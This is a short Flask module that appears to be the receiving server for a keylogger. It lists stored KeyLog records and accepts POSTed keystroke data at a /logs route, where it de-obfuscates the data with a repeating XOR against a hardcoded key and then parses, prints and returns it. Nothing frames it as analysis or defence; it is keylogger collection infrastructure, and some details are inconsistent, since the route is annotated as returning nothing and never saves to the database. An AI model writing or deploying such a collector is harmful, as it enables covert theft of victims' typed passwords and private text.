from flask import render_template, request
from model import KeyLog
import json

def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
    key: bytes = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def register_routes(app, db):

    @app.route('/')
    def index():
        logs: list[KeyLog] = KeyLog.query.all()
        return render_template('index.html', logs=logs)

    @app.route('/logs', methods=['POST'])
    def logs() -> None:
        if request.method == 'POST':
            data = decrypt_data(request.data).decode()
            data_dict = json.loads(data)
            print(data_dict)
            return data
